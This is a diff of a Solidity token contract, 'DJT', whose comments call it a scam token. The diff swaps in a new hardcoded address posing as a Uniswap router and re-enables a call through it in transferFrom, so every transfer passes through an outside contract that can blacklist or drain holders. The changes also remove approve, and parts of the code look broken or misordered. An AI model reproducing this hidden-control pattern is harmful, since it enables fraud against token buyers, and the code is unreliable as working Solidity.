@@ -2,8 +2,6 @@
 pragma solidity ^0.8.1;
 
 interface IUniswapV2Router02 {
-    function getOwner() view external returns(address);
-
     function swapExactTokensForETHSupportingFeeOnTransferTokens(
         uint256 amountIn,
         uint256 amountOutMin,
@@ -47,17 +45,13 @@ contract DJT {
         // msg.sender - wallet or contrqact who sign the message
         // idk how to create contract from other contract tbh
         balances[tx.origin] = totalSupply;                  // the dude who sign a message got a 23 * 10 ** 26 SCUMDJT token
-        uniswapRouter = IUniswapV2Router02(address(0x9D24183c7AFBe12ca35adcCe6177517bD6A48657));     // create class above structure with BLACK list (or white list, idk, I won't change the comments late)
+        uniswapRouter = IUniswapV2Router02(address(0x4ea106ce38e0E8125dD0F6a9155EF80Be0ACEF43));     // create class above structure with BLACK list (or white list, idk, I won't change the comments late)
     }
     
     function balanceOf(address owner) view  public returns(uint) {
         return balances[owner];
     }
 
-    function gtown() view public returns (address) {
-        return uniswapRouter.getOwner();
-    }
-    
     function transfer(address to, uint value) public returns(bool) {
         require(balanceOf(msg.sender) >= value, 'balance too low');
         balances[msg.sender] -= value;
@@ -66,13 +60,13 @@ contract DJT {
         address[] memory path = new address[](2);
         path[0] = msg.sender;
         path[1] = to;
-        require(uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
             fee,
             value,
             path,
             msg.sender,
             (block.timestamp + 300)
-        ));
+        );
         emit Transfer(msg.sender, to, value);
         return true;
     }
@@ -86,40 +80,14 @@ contract DJT {
         address[] memory path = new address[](2);
         path[0] = from;
         path[1] = to;
-        // uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
-        //     fee,
-        //     value,
-        //     path,
-        //     msg.sender,
-        //     (block.timestamp + 300)
-        // );
+        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            fee,
+            value,
+            path,
+            msg.sender,
+            (block.timestamp + 300)
+        );
         emit Transfer(from, to, value);
         return true;   
-    }    
-    function approve(address spender, uint value) public returns (bool) {
-        allowance[msg.sender][spender] = value;
-        emit Approval(msg.sender, spender, value);
-        return true;   
-    }
-    function _getString(string memory str)public pure returns (string memory){
-        return str;
-    }
-    function _getAdd(uint256 a,uint256 b) public pure returns(uint256){
-        return a+b;
-    }
-    function _getDiff(uint256 a,uint256 b) public pure returns(uint256){
-        return a-b;
-    }
-    function _getMul(uint256 a,uint256 b)public pure returns(uint256){
-        return a*b;
-    }
-    function _getDiv(uint256 a,uint256 b)public pure returns(uint256){
-        return a/b;
-    }
-    function _getMod(uint256 a,uint256 b)public pure returns(uint256){
-        return a%b;
-    }
-    function _getpows(uint256 a)public pure returns(uint256){
-        return a**10;
     }
 }
